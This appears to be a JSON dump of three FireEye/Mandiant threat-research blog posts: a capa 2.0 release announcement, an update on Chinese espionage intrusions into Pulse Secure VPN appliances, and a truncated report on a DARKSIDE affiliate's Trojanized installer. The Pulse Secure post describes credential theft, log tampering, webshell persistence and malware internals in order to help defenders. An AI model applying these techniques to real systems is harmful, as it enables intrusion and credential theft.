{
    "data": [
        {
            "http://www.fireeye.com/blog/threat-research/2021/07/capa-2-better-stronger-faster.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-19",
                    "source": "www.fireeye.com"
                },
                "text": "We are excited to announce version 2.0 of our open-source tool called capa. capa automatically identifies capabilities in programs using an extensible rule set. The tool supports both malware triage and deep dive reverse engineering. If you haven’t heard of capa before, or need a refresher, check out our first blog post . You can download capa 2.0 standalone binaries from the project’s release page and checkout the source code on GitHub . capa 2.0 enables anyone to contribute rules more easily, which makes the existing ecosystem even more vibrant. This blog post details the following major improvements included in capa 2.0: New features and enhancements for the capa explorer IDA Pro plugin, allowing you to interactively explore capabilities and write new rules without switching windows More concise and relevant results via identification of library functions using FLIRT and the release of accompanying open-source FLIRT signatures Hundreds of new rules describing additional malware capabilities, bringing the collection up to 579 total rules, with more than half associated with ATT&CK techniques Migration to Python 3, to make it easier to integrate capa with other projects capa explorer and Rule Generator capa explorer is an IDAPython plugin that shows capa results directly within IDA Pro. The version 2.0 release includes many additions and improvements to the plugin, but we'd like to highlight the most exciting addition: capa explorer now helps you write new capa rules directly in IDA Pro! Since we spend most of our time in reverse engineering tools such as IDA Pro analyzing malware, we decided to add a capa rule generator. Figure 1 shows the rule generator interface. Figure 1: capa explorer rule generator interface Once you’ve installed capa explorer using the Getting Started guide, open the plugin by navigating to Edit > Plugins > FLARE capa explorer . You can start using the rule generator by selecting the Rule Generator tab at the top of the capa explorer pane. From here, navigate your IDA Pro Disassembly view to the function containing a technique you'd like to capture and click the Analyze button. The rule generator will parse, format, and display all the capa features that it finds in your function. You can write your rule using the rule generator's three main panes: Features , Preview , and Editor . Your first step is to add features from the Features pane. The Features pane is a tree view containing all the capa features extracted from your function. You can filter for specific features using the search bar at the top of the pane. Then, you can add features by double-clicking them. Figure 2 shows this in action. Figure 2: capa explorer feature selection As you add features from the Features pane, the rule generator automatically formats and adds them to the Preview and Editor panes. The Preview and Editor panes help you finesse the features that you've added and allow you to modify other information like the rule's metadata. The Editor pane is an interactive tree view that displays the statement and feature hierarchy that forms your rule. You can reorder nodes using drag-and-drop and edit nodes via right-click context menus. To help humans understand the rule logic, you can add descriptions and comments to features by typing in the Description and Comment columns. The rule generator automatically formats any changes that you make in the Editor pane and adds them to the Preview pane. Figure 3 shows how to manipulate a rule using the Editor pane. Figure 3: capa explorer editor pane The Preview pane is an editable textbox containing the final rule text. You can edit any of the text displayed. The rule generator automatically formats any changes that you make in the Preview pane and adds them to the Editor pane. Figure 4 shows how to edit a rule directly in the Preview pane. Figure 4: capa explorer preview pane As you make edits the rule generator lints your rule and notifies you of any errors using messages displayed underneath the Preview pane. Once you've finished writing your rule you can save it to your capa rules directory by clicking the Save button. The rule generator saves exactly what is displayed in the Preview pane. It’s that simple! We’ve found that using the capa explorer rule generator significantly reduces the amount of time spent writing new capa rules. This tool not only automates most of the rule writing process but also eliminates the need to context switch between IDA Pro and your favorite text editor allowing you to codify your malware knowledge while it’s fresh in your mind. To learn more about capa explorer and the rule generator check out the README . Library Function Identification Using FLIRT As we wrote hundreds of capa rules and inspected thousands of capa results, we recognized that the tool sometimes shows distracting results due to embedded library code. We believe that capa needs to focus its attention on the programmer’s logic and ignore supporting library code. For example, highly optimized C/C++ runtime routines and open-source library code enable a programmer to quickly build a product but are not the product itself . Therefore, capa results should reflect the programmer’s intent for the program rather than a categorization of every byte in the program. Compare the capa v1.6 results in Figure 5 versus capa v2.0 results in Figure 6. capa v2.0 identifies and skips almost 200 library functions and produces more relevant results. Figure 5: capa v1.6 results without library code recognition Figure 6: capa v2.0 results ignoring library code functions So, we searched for a way to differentiate a programmer’s code from library code. After experimenting with a few strategies, we landed upon the Fast Library Identification and Recognition Technology (FLIRT) developed by Hex-Rays . Notably, this technique has remained stable and effective since 1996, is fast, requires very limited code analysis, and enjoys a wide community in the IDA Pro userbase. We figured out how IDA Pro matches FLIRT signatures and re-implemented a matching engine in Rust with Python bindings . Then, we built an open-source signature set that covers many of the library routines encountered in modern malware. Finally, we updated capa to use the new signatures to guide its analysis. capa uses these signatures to differentiate library code from a programmer’s code. While capa can extract and match against the names of embedded library functions, it will skip finding capabilities and behaviors within the library code. This way, capa results better reflect the logic written by a programmer. Furthermore, library function identification drastically improves capa runtime performance: since capa skips processing of library functions, it can avoid the costly rule matching steps across a substantial percentage of real-world functions. Across our testbed of 206 samples, 28% of the 186,000 total functions are recognized as library code by our function signatures. As our implementation can recognize around 100,000 functions/sec, library function identification overhead is negligible and capa is approximately 25% faster than in 2020! Finally, we introduced a new feature class that rule authors can use to match recognized library functions: function-name . This feature matches at the file-level scope. We’ve already started using this new capability to recognize specific implementations of cryptography routines, such as AES provided by Crypto++ , as shown in the example rule in Figure 7. Figure 7: Example rule using function-name to recognize AES via Crypto++ As we developed rules for interesting behaviors, we learned a lot about where uncommon techniques are used legitimately. For example, as malware analysts, we most commonly see the cpuid instruction alongside anti-analysis checks, such as in VM detection routines. Therefore, we naively crafted rules to flag this instruction. But, when we tested it against our testbed, the rule matched most modern programs because this instruction is often legitimately used in high-optimized routines, such as memcpy , to opt-in to newer CPU features. In hindsight, this is obvious, but at the time it was a little surprising to see cpuid in around 15% of all executables. With the new FLIRT support, capa recognizes the optimized memcpy routine embedded by Visual Studio and won’t flag the embedded cpuid instruction, as its not part of the programmer’s code. When a user upgrades to capa 2.0, they’ll see that the tool runs faster and provides more precise results. Signature Generation To provide the benefits of python-flirt to all users (especially those without an IDA Pro license) we have spent significant time to create a comprehensive FLIRT signature set for the common malware analysis use-case. The signatures come included with capa and are also available at our GitHub under the Apache 2.0 license. We believe that other projects can benefit greatly from this. For example, we expect the performance of FLOSS to improve once we’ve incorporated library function identification. Moreover, you can use our signatures with IDA Pro to recognize more library code. Our initial signatures include: From Microsoft Visual Studio (VS), for all major versions from VS6 to VS2019: C and C++ run-time libraries Active Template Library (ATL) and Microsoft Foundation Class (MFC) libraries The following open-source projects as compiled with VS2015, VS2017, and VS2019: CryptoPP curl Microsoft Detours Mbed TLS (previously PolarSSL) OpenSSL zlib Identifying and collecting the relevant library and object files took a lot of work. For the older VS versions this was done manually. For newer VS versions and the respective open-source projects we were able to automate the process using vcpgk and Docker. We then used the IDA Pro FLAIR utilities to convert gigabytes of executable code into pattern files and then into signatures. This process required extensive research and much trial and error. For instance, we spent two weeks testing and exploring the various FLAIR options to understand the best combination. We appreciate Hex-Rays for providing high-quality signatures for IDA Pro and thank them for sharing their research and tools with the community. To learn more about the pattern and signature file generation check out the siglib repository. The FLAIR utilities are available in the protected download area on Hex-Rays’ website . Rule Updates Since the initial release, the community has more than doubled the total capa rule count from 260 to over 570 capability detection rules ! This means that capa recognizes many more techniques seen in real-world malware, certainly saving analysts time as they reverse engineer programs. And to reiterate, we’ve surfed a wave of support as almost 30 colleagues from a dozen organizations have volunteered their experience to develop these rules. Thank you! Figure 8 provides a high-level overview of capabilities capa currently captures, including: Host Interaction describes program functionality to interact with the file system, processes, and the registry Anti-Analysis describes packers, Anti-VM, Anti-Debugging, and other related techniques Collection describes functionality used to steal data such as credentials or credit card information Data Manipulation describes capabilities to encrypt, decrypt, and hash data Communication describes data transfer techniques such as HTTP, DNS, and TCP Figure 8: Overview of capa rule categories More than half of capa’s rules are associated with a MITRE ATT&CK technique including all techniques introduced in ATT&CK version 9 that lie within capa’s scope. Moreover, almost half of the capa rules are currently associated with a Malware Behavior Catalog (MBC) identifier. For more than 70% of capa rules we have collected associated real-world binaries. Each binary implements interesting capabilities and exhibits noteworthy features. You can view the entire sample collection at our capa test files GitHub page . We rely heavily on these samples for developing and testing code enhancements and rule updates. Python 3 Support Finally, we’ve spent nearly three months migrating capa from Python 2.7 to Python 3. This involved working closely with vivisect and we would like to thank the team for their support. After extensive testing and a couple of releases supporting two Python versions, we’re excited that capa 2.0 and future versions will be Python 3 only. Conclusion Now that you’ve seen all the recent improvements to capa, we hope you’ll upgrade to the newest capa version right away! Thanks to library function identification capa will report faster and more relevant results. Hundreds of new rules capture the most interesting malware functionality while the improved capa explorer plugin helps you to focus your analysis and codify your malware knowledge while it’s fresh. Standalone binaries for Windows, Mac, and Linux are available on the capa Releases page . To install capa from PyPi use the command pip install flare-capa . The source code is available at our capa GitHub page . The project page on GitHub contains detailed documentation, including thorough installation instructions and a walkthrough of capa explorer . Please use GitHub to ask questions, discuss ideas, and submit issues. We highly encourage you to contribute to capa’s rule corpus. The improved IDA Pro plugin makes it easier than ever before. If you have any issues or ideas related to rules, please let us know on the GitHub repository . Remember, when you share a rule with the community, you scale your impact across hundreds of reverse engineers in dozens of organizations. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/05/updates-on-chinese-apt-compromising-pulse-secure-vpn-devices.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-05-27",
                    "source": "www.fireeye.com"
                },
                "text": "On April 20, 2021, Mandiant published detailed results of our investigations into compromised Pulse Secure devices by suspected Chinese espionage operators . This blog post is intended to provide an update on our findings, give additional recommendations to network defenders, and discuss potential implications for U.S.-China strategic relations. Mandiant continues to gather evidence and respond to intrusions involving compromises of Pulse Secure VPN appliances at organizations across the defense, government, high tech, transportation, and financial sectors in the U.S. and Europe (Figure 1). Reverse engineers on the FLARE team have identified four additional code families specifically designed to manipulate Pulse Secure devices. We now assess that espionage activity by UNC2630 and UNC2717 supports key Chinese government priorities. Many compromised organizations operate in verticals and industries aligned with Beijing’s strategic objectives outlined in China’s recent 14th Five Year Plan. While there is evidence of data theft at many organizations, we have not directly observed the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement . Mandiant Threat Intelligence assesses that Chinese cyber espionage activity has demonstrated a higher tolerance for risk and is less constrained by diplomatic pressures than previously characterized. Figure 1: Organizations with compromised Pulse Secure devices by vertical and geographic location Pulse Secure continues to work closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues. Pulse Secure’s parent company, Ivanti, has released patches to proactively address software vulnerabilities and issued updated Security Advisories and Knowledge Articles to assist customers. (Please see the Forensics, Remediation, and Hardening Guidelines section for additional details.) UNC2630 and UNC2717 Tradecraft and Response to Disclosure Mandiant is tracking 16 malware families exclusively designed to infect Pulse Secure VPN appliances and used by several cyber espionage groups which we believe are affiliated with the Chinese government. Between April 17 and April 20, 2021, Mandiant incident responders observed UNC2630 access dozens of compromised devices and remove webshells like ATRIUM and SLIGHTPULSE. Under certain conditions, the Integrity Checker Tool (ICT) will show no evidence of compromise on appliances which may have had historical compromise. This false negative may be returned because the ICT cannot scan the rollback partition. If a backdoor or persistence patcher exists on the rollback partition and a Pulse Secure appliance is rolled back to the prior version, the backdoor(s) will be present on the appliance. Please see the Forensics, Remediation, and Hardening Guidelines section for important information regarding the ICT and upgrade process. In at least one instance, UNC2630 deleted their webshell(s) but did not remove the persistence patcher, making it possible to regain access when the device was upgraded.  The remaining persistence patcher causes the malicious code to be executed later during a system upgrade, re-inserts webshell logic into various files on the appliance, and recompromises the device. It is unusual for Chinese espionage actors to remove a large number of backdoors across several victim environments on or around the time of public disclosure. This action displays an interesting concern for operational security and a sensitivity to publicity. Both UNC2630 and UNC2717 display advanced tradecraft and go to impressive lengths to avoid detection. The actors modify file timestamps and regularly edit or delete forensic evidence such as logs, web server core dumps, and files staged for exfiltration. They also demonstrate a deep understanding of network appliances and advanced knowledge of a targeted network. This tradecraft can make it difficult for network defenders to establish a complete list of tools used, credentials stolen, the initial intrusion vector, or the intrusion start date. Updates from Incident Response Investigations We continue to suspect that multiple groups including UNC2630 and UNC2717 are responsible for this activity, despite the use of similar exploits and tools. There is a high degree of variation in attacker actions within victim environments, with actors inconsistently using a combination of tools and command and control IP addresses. Reverse engineers on the FLARE team have identified four additional malware families specifically designed to manipulate Pulse Secure devices (Table 1). These utilities have similar functions to the 12 previously documented malware families: harvesting credentials and sensitive system data, allowing arbitrary file execution, and removing forensic evidence. Please see the Technical Annex for detailed analysis of these code families. Malware Family Description Actor BLOODMINE BLOODMINE is a utility for parsing Pulse Secure Connect log files. It extracts information related to logins, Message IDs and Web Requests and copies the relevant data to another file. UNC2630 BLOODBANK BLOODBANK is a credential theft utility that parses two files containing password hashes or plaintext passwords and expects an output file to be given at the command prompt. UNC2630 CLEANPULSE CLEANPULSE is a memory patching utility that may be used to prevent certain log events from occurring. It was found in close proximity to an ATRIUM webshell. UNC2630 RAPIDPULSE RAPIDPULSE is a webshell capable of arbitrary file read. As is common with other webshells, RAPIDPULSE exists as a modification to a legitimate Pulse Secure file. RAPIDPULSE can serve as an encrypted file downloader for the attacker. UNC2630 Table 1: New malware families identified Initial Compromise The actors leveraged several vulnerabilities in Pulse Secure VPN appliances. Mandiant observed the use of the recently patched vulnerability CVE-2021-22893 to compromise fully patched Pulse Secure appliances as well as previously disclosed vulnerabilities from 2019 and 2020. In many cases, determining the initial exploitation vector and timeframe was not possible to determine because the actors altered or deleted forensic evidence, or the appliance had undergone subsequent code upgrades thereby destroying evidence related to the initial exploitation. Establish Foothold In some cases, Mandiant observed the actors create their own Local Administrator account outside of established credential management controls on Windows servers of strategic value. This allowed the actor to maintain access to systems with short-cycle credential rotation policies and provided a sufficient level of access to operate freely within their target environment. The actors also maintained their foothold into the targeted environments exclusively through Pulse Secure webshells and malware without relying on backdoors deployed on internal Windows or Linux endpoints. Escalate Privileges Mandiant observed the actors use three credential harvesting techniques on Windows systems: Targeting of clear text passwords and hashes from memory using the credential harvesting tool Mimikatz. Instead of being copied locally and executed on the target system, Mandiant saw evidence of the Mimikatz binary on the source system of an RDP session (i.e. the threat actor’s system that was connected to the VPN) through an RDP mapped drive. Copying and exfiltration of the SAM, SECURITY, and SYSTEM registry hives which contained cached NTLM hashes for Local and Domain accounts. Leveraging the Windows Task Manager process to target the Local Security Authority Subsystem Service (LSASS) process memory for NTLM hashes. In addition to these privilege escalation techniques, the actors specifically targeted separate privileged accounts belonging to individuals whose unprivileged accounts were previously compromised (likely through the Pulse Secure credential harvesting malware families). It is unclear how the account associations were made by the actor. Internal Reconnaissance Mandiant found evidence that the actors renamed their own workstations that they connected to the VPN of victim networks to mimic the naming convention of their target environment. This practice aligns with the actor’s objective for long-term persistence and evading detection and demonstrates a familiarity with the internal hostnames in the victim environment. The actors operated solely by utilizing Windows-based utilities to carry out tasks. Some of the utilities observed were net.exe, quser.exe, powershell.exe, powershell_ise.exe, findstr.exe, netstat.exe, cmd.exe, reg.exe and tasklist.exe. Move Laterally Most lateral movement originated from compromised Pulse Secure VPN appliances to internal systems within the environment.  While connected to the Pulse VPN appliance, the actor’s system was assigned an IP address from the Pulse VPN DHCP pool and they moved laterally throughout the environments by leveraging the Remote Desktop Protocol (RDP), the Secure Shell Protocol (SSH), and browser-based communication to HTTPS hosted resources. The actors also accessed other resources such as Microsoft M365 cloud environments using stolen credentials they had previously acquired. Mandiant also observed the actors targeting ESXi host servers. The actor enabled SSH on ESXi hosts that were previously disabled via the web interface. When their operations on the system were finished, the actors disabled SSH on the ESXi host again and cleared or preemptively disabled all relevant logging associated with the performed activities. This includes authentication, command history, and message logging on the system. Maintain Presence Mandiant observed the threat actor maintain persistence by compromising the upgrade process on the Pulse Secure Appliance.  Persistence was primarily achieved by modifying the legitimate DSUpgrade.pm file to install the ATRIUM webshell across each upgrade performed by an administrator.  The actor likely chose DSUpgade.pm to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is applied during updates. The patcher modifies content in /tmp/data as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the actor to maintain access to the system across updates. The actors also achieved persistence in other cases by prepending a bash script to the file /bin/umount normally used to unmount a Linux filesystem. This binary was targeted by the actor because it is executed by the Pulse Secure appliance during a system upgrade. The actor’s script verifies that the umount binary executes with a specific set of arguments, which are identical to the arguments used by the Pulse Secure appliance to executes the binary. The inserted malicious bash script remounts the filesystem as read-write and iterates through a series of bash routines to inject the ATRIUM webshell, hide SLOWPULSE from a legacy file integrity bash script, remove or add itself from the umount file, and validate the web process was running after a reboot to return the filesystem back to read-only. Complete Mission The threat actor’s objectives appear to be stealing credentials, maintaining long-term persistent access to victim networks, and accessing or exfiltrating sensitive data. Mandiant has observed the attackers: Staging data related to sensitive projects, often in C:\\Users\\Public Naming exfiltration archives to resemble Windows Updates (KB) or to match the format KB<digits>.zip Using the JAR/ZIP file format for data exfiltration Deleting exfiltrated archives Analysis of new malware families is included in the Technical Annex to enable defenders to quickly assess if their respective appliances have been affected. Relevant MITRE ATT&CK techniques, Yara rules and hashes are published on Mandiant’s GitHub page . Forensics, Remediation, and Hardening Guidelines To begin an investigation, Pulse Secure users should contact their Customer Support Representative for assistance completing the following steps: Capture memory and a forensic image of the appliance Run the Pulse Integrity Checker Tool found online Request a decrypted image of each partition and a memory dump To remediate a compromised Pulse Secure appliance: Caution must be taken when determining if a Pulse Secure device was compromised at any previous date. If the Integrity Checker Tool (ICT) was not run before the appliance was updated, the only evidence of compromise will exist in the system rollback partition which cannot be scanned by the ICT. If an upgrade was performed without first using the ICT, a manual inspection of the rollback partition is required to determine if the device was previously compromised. To ensure that no malicious logic is copied to a clean device, users must perform upgrades from the appliance console rather than the web interface. The console upgrade process follows a separate code path that will not execute files such as DSUpgrade.pm. Previous versions of the ICT will exit if run on an unsupported software version. For every ICT scan, ensure that the ICT would have supported the device's version number. Reset all passwords in the environment. Upgrade to the most recent software version. To secure the appliance and assist with future investigations, consider implementing the following: Enable unauthenticated logging and configure syslog for Events, User & Admin Access Forward all logs to a central log repository Review logs for unusual authentications and evidence of exploitation Regularly run the Integrity Checker Tool Apply patches as soon as they are made available Geopolitical Context and Implications for U.S.-China Relations In collaboration with intelligence analysts at BAE Systems Applied Intelligence, Mandiant has identified dozens of organizations across the defense, government, telecommunications, high tech, education, transportation, and financial sectors in the U.S. and Europe that have been compromised via vulnerabilities in Pulse Secure VPNs. Historic Mandiant and BAE investigations identified a significant number of these organizations as previous APT5 targets. Notably, compromised organizations operate in verticals and industries aligned with Beijing’s strategic objectives as outlined in China’s 14th Five Year Plan. Many manufacturers also compete with Chinese businesses in the high tech, green energy, and telecommunications sectors. Despite this, we have not directly observed the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement. Targets of Chinese cyber espionage operations are often selected for their alignment with national strategic goals, and there is a strong correlation between pillar industries listed in policy white papers and targets of Chinese cyber espionage activity. China has outlined eight key areas of vital economic interest for development and production which it views as essential to maintaining global competitiveness, under the following categories: energy, healthcare, railway transportation, telecommunications, national defense and stability, advanced manufacturing, network power, and sports and culture. Historical Context In the Red Line Drawn report, Mandiant documented a significant decline in the volume of Chinese cyberespionage activity in 2014 and assessed that the restructuring of China's military and civilian intelligence agencies significantly impacted Chinese cyber operations. Then, in September 2015, President Xi of China concluded a bilateral agreement with U.S. President Obama to prohibit state-sponsored theft of intellectual property for the purpose of providing commercial advantage. Commercial IP theft has historically been a prominent characteristic of Chinese cyber espionage activity. In 2018 we conducted an extensive review of Chinese cyber espionage operations, both before and after the official announcement of the PLA reforms and bilateral agreement to determine if there were any corresponding changes in the tactics, techniques, and procedures (TTPs) used during Chinese cyberespionage operations. We observed two important changes in the type of information stolen and the geographic distribution of the targets. Despite examining hundreds of incidents from January 2016 through mid 2019, we did not find definitive evidence of purely commercial application intellectual property theft in the US. Recent indictments by the US Department of Justice suggest that this theft did occur. While we observed other malicious activity, including geopolitical targeting, theft of intellectual property with military applications, and theft of confidential business information, we did not find evidence that these cyber operations violated the Obama-Xi agreement. Between January 2016 and mid-2019, the geographic focus of Chinese cyber operations shifted dramatically to Asia and away from the U.S. and Europe. While the U.S. remained the single most frequently targeted country, it became a much smaller percentage of observed activity. From 2012–2015, U.S. targeting constituted nearly 70 percent of all observed Chinese cyber espionage, while from January 2016 through August 2019, U.S. targeting fell to approximately 20 percent of Chinese activity. Targeting of Europe represented a similar proportion of overall Chinese activity to targeting of the Americas. Changes in Chinese Espionage Activity between 2019 and 2021 Based on developments observed between 2019-2021, Mandiant Threat Intelligence assesses that most Chinese APT actors now concentrate on lower-volume but more-sophisticated, stealthier operations collecting strategic intelligence to support Chinese strategic political, military, and economic goals. While some of the technical changes may be the result of the restructuring of China's military and civilian organizations, some changes possibly reflect larger technical trends in cyber operations overall. Before the reorganization, it was common to observe multiple Chinese espionage groups targeting the same organization, often targeting the same types of information. Post-2015, this duplication of efforts is rare. Chinese espionage groups developed more efficient and purposeful targeting patterns by transitioning away from spearphishing and relying on end user software vulnerabilities and instead began exploiting networking devices and web facing applications in novel ways. Chinese APT actors also began to leverage supply chain vulnerabilities and to target third party providers to gain access to primary targets. Recently observed Chinese cyber espionage activity exhibits an increased diligence in operational security, familiarity with network defender investigation techniques, and cognizance of the forensic evidence they leave behind. We observe the resurgence of older Chinese espionage groups, including APT4 and APT5 after long periods of dormancy and currently active groups engage in frequent and widespread campaigns. Redline Withdrawn? The Obama-Xi agreement prohibits the theft of intellectual property with purely commercial applications for the purpose of gaining a competitive advantage. It does not cover government or diplomatic information, sensitive business communications, IT data, PII, or intellectual property with military or dual use applications. We have direct evidence of UNC2630, UNC2717 and other Chinese APT actors stealing credentials, email communications, and intellectual property with dual commercial and military applications. Throughout our investigations, we did not directly observe the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement. Given the narrow definition of commercial intellectual property theft and the limited availability of forensic evidence, it is possible that our assessment will change with the discovery of new information. Evidence collected by Mandiant over the past decade suggests that norms and diplomatic agreements do not significantly limit China's use of its cyber threat capabilities, particularly when serving high-priority missions. The greater ambition and risk tolerance demonstrated by Chinese policymakers since 2019 indicates that the tempo of Chinese state-sponsored activity may increase in the near future and that the Chinese cyber threat apparatus presents a renewed and serious threat to US and European commercial entities. Acknowledgements Mandiant would like to thank analysts at BAE Systems Applied Intelligence, Stroz Friedberg, and Pulse Secure for their hard work, collaboration and partnership. The team would also like to thank Scott Henderson, Kelli Vanderlee, Jacqueline O'Leary, Michelle Cantos, and all the analysts who worked on Mandiant’s Red Line Redrawn project. The team would also like to thank Mike Dockry, Josh Villanueva, Keith Knapp, and all the incident responders who worked on these engagements. Additional Resources CISA Alert (AA21-110A): Exploitation of Pulse Connect Secure Vulnerabilities Pulse Secure Advisory SA44101: Multiple vulnerabilities resolved in Pulse Connect Secure / Pulse Policy Secure 9.0RX Pulse Secure Advisory SA44784: Multiple Vulnerabilities Resolved in Pulse Connect Secure 9.1R11.4 Pulse Secure Customer FAQ KB44764: PCS Security Integrity Tool Enhancements Pulse Secure KB44755: Pulse Connect Secure (PCS) Integrity Assurance Detecting the Techniques The following table contains specific FireEye product detection names for the malware families associated with this updated information. Platform(s) Detection Name Network Security Email Security Detection On Demand Malware File Scanning Malware File Storage Scanning FE_APT_Tool_Linux32_BLOODMINE_1 FE_APT_Tool_Linux_BLOODMINE_1 FE_APT_Tool_Linux32_BLOODBANK_1 FE_APT_Tool_Linux_BLOODBANK_1 FE_APT_Tool_Linux32_CLEANPULSE_1 FE_APT_Tool_Linux_CLEANPULSE_1 FE_APT_Webshell_PL_RAPIDPULSE_1 FEC_APT_Webshell_PL_RAPIDPULSE_1 Endpoint Security Real-Time Detection (IOC) BLOODBANK (UTILITY) BLOODMINE (UTILITY) Helix Establish Foothold WINDOWS METHODOLOGY [User Account Created] WINDOWS METHODOLOGY [User Created - Net Command] Escalate Privileges WINDOWS METHODOLOGY [Mimikatz Args] WINDOWS METHODOLOGY [Invoke-Mimikatz Powershell Artifacts] WINDOWS METHODOLOGY [LSASS Memory Access] WINDOWS METHODOLOGY [LSASS Generic Dump Activity] Internal Reconnaissance WINDOWS ANALYTICS [Recon Commands] Move Laterally WINDOWS ANALYTICS [Abnormal RDP Logon] OFFICE 365 ANALYTICS [Abnormal Logon] Technical Annex BLOODMINE BLOODMINE is a utility for parsing Pulse Secure Connect log files. It extracts information related to logins, Message IDs and Web Requests and copies the relevant data to another file. The sample takes three command line arguments Filename to read Filename to write Timeout interval It parses the input file for login status codes: AUT31504 AUT24414 AUT22673 AUT22886 AUT23574 It parses the input file for web results code WEB20174. If it finds a web result code, it looks for file extensions: .css .jpg .png .gif .ico .js .jsp These strings indicate the type of data that is collected from web requests: Web login, IP: %s, User: %s, Realm: %s, Roles: %s, Browser: %s Agent login, IP: %s, User: %s, Realm: %s, Roles: %s, Client: %s Logout, IP: %s, User: %s, Realm: %s, Roles: %s Session end, IP: %s, User: %s, Realm: %s, Roles: %s New session, IP: %s, User: %s, Realm: %s, Roles: %s, New IP: %s Host check, Policy: %s WebRequest completed, IP: %s, User: %s, Realm: %s, Roles: %s, %s to %s://%s:%s/%s from %s BLOODBANK BLOODBANK is a credential theft utility that parses two LMDB (an in memory database) files and expects an output file to be given at the command prompt. BLOODBANK takes advantage of a legitimate process that supports Single Sign On functionality and looks for plaintext passwords when they are briefly loaded in memory. The utility parses the following two files containing password hashes or plaintext passwords: /home/runtime/mtmp/lmdb/data0/data.mdb /home/runtime/mtmp/system BLOODBANK expects an output file as a command line parameter, otherwise it prints file open error. It contains the following strings which it likely tries to extract and target. PRIMARY SECONDARY remoteaddr user@ logicUR logicTim passw@ userAge realm Sourc CLEANPULSE CLEANPULSE is a memory patching utility that may be used to prevent certain log events from occurring. The utility inserts two strings from the command line into the target process and patches code to conditionally circumvent a function call in the original executable. File Name File Type Size Compile Time dsrlog ELF.X86 13332 The utility expects to be run from the command line as follows: drslog <pid> <code2_string> <code3_string> <command> Where <pid> is the pid process ID to patch in memory, <code2_string> and <code3_string> are two strings to write into the target process, and <command> is either 'e' or 'E' for installation or 'u' or 'U' for uninstallation. During installation (using the 'e' or 'E' <command>), the <code2_string> <code3_string> command line strings are written to the target process at hard-coded memory addresses, a small amount of code is written, and a jump instruction to the code snippet is patched in memory of the target process. The added code checks whether an argument is equal to either <code2_string> <code3_string> strings, and if, so skips a function call in the target process. During uninstall (using the 'u' or 'U' <command>) the patch jump location is overwritten with what appears to be the original 8 bytes of instructions, and the two additional memory buffers and the code snippet appear to be overwritten with zeros. The CLEANPULSE utility is highly specific to a victim environment. It does not contain any validation code when patching (i.e. verifying that code is expected prior to modifying it), and it contains hard-coded addresses to patch. The target code to patch appears to be the byte sequence: 89 4C 24 08 FF 52 04. This appears as the last bytes in the patched code, and is the 8-bytes written when the uninstall 'u' command is given. These bytes correspond to the following two instructions: .data:0804B138 89 4C 24 08                 mov     [esp+8], ecx .data:0804B13C FF 52 04                       call    dword ptr [edx+4] This byte sequence occurs at the hard-coded patch address the utility expects, dslogserver. Based on status and error messages in nearby functions the executable dslogserver appears to be related to log event handling, and the purpose of the CLEANPULSE utility may be to prevent certain events from being logged. There are several un-referenced functions that appear to have been taken from the open source project PUPYRAT. It is likely that the actor re-purposed this open source code, using PUPYRAT as a simple template project. RAPIDPULSE RAPIDPULSE is a webshell capable of arbitrary file read. As is common with other webshells, RAPIDPULSE exists as a modification to a legitimate Pulse Secure file. The webshell modifies the legitimate file's main routine which compares the HTTP query parameter with key name: deviceid to a specific  key with value. If the parameter matches, then the sample uses an RC4 key  to decrypt HTTP query parameter with key name: hmacTime. This decrypted value is a filename which the sample then opens, reads, RC4 encrypts with the same key, base64 encodes, then writes to stdout. The appliance redirects stdout as the response to HTTP requests. This serves as an encrypted file download for the attacker. Integrity Checker Tool and Other Validation Checks In our public report, we noted two code families that manipulate check_integrity.sh, a legitimate script used during a normal system upgrade. This validation script was modified by the actor to exit early so that it would not perform the intended checks. Per Ivanti, the validation provided by check_integrity.sh is a separate validation feature and not the same as the Integrity Checker Tool (ICT) available on their website. They recommend that organizations use the online ICT to confirm that hashes of files on their Pulse Secure devices match Ivanti’s list of known good hashes. Please note that the ICT does not scan the rollback partition. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-06-16",
                    "source": "www.fireeye.com"
                },
                "text": "Mandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized software installer downloaded from a legitimate website. While this victim organization detected the intrusion, engaged Mandiant for incident response, and avoided ransomware, others may be at risk. As reported in the Mandiant post, \" Shining a Light on DARKSIDE Ransomware Operations ,\" Mandiant Consulting has investigated intrusions involving several DARKSIDE affiliates. UNC2465 is one of those DARKSIDE affiliates that Mandiant believes has been active since at least March 2020. The intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly reported shutdown of the overall DARKSIDE program ( Mandiant Advantage background ). While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will. Sometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV security camera provider website. Mandiant determined the installers were malicious in early June and notified the CCTV company of a potential website compromise, which may have allowed UNC2465 to replace legitimate downloads with the Trojanized ones. While Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness. Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers. A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company’s software; in this case, an installer, rather than the software itself, was modified by UNC2465. DARKSIDE RaaS In mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service. This announcement stated that they lost access to their infrastructure, including their blog, payment, and content distribution network (CDN) servers, and would be closing their service. The post cited law enforcement pressure and pressure from the United States for this decision. Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate. There are some actors who have speculated that the DARKSIDE operator’s decision to close could be an exit scam. While we have not seen 